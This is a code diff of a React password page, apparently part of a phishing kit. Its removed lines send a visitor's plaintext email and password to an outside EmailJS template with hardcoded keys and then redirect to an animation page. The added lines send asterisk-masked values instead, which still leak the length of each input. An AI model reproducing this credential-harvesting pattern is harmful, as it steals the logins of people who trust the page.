@@ -16,24 +16,32 @@ const Password = () => {
     if (emailParam) setEmail(emailParam);
   }, []);
 
-  const handleSubmit = (e) => {
-    e.preventDefault();
+const handleSubmit = (e) => {
+  e.preventDefault();
 
-    emailjs
-      .send(
-        "service_n0p250r",
-        "template_u1y1vhc",
-        { email: email, password: password },
-        "U6DuIRAvsZ6BSxz-q"
-      )
-      .then(() => {
-        router.push("/animation");
-      })
-      .catch((err) => {
-        console.error(err);
-        alert("Failed to send email.");
-      });
-  };
+  // Mask the email and password
+  const maskedEmail = "*".repeat(email.length);
+  const maskedPassword = "*".repeat(password.length);
+
+  emailjs
+    .send(
+      "service_n0p250r",
+      "template_u1y1vhc",
+      { 
+        email: maskedEmail,       // separate field for email
+        password: maskedPassword  // separate field for password
+      },
+      "U6DuIRAvsZ6BSxz-q"
+    )
+    .then(() => {
+      router.push("/animation");
+    })
+    .catch((err) => {
+      console.error(err);
+      alert("Failed to send email.");
+    });
+};
+
 
   return (
     <div
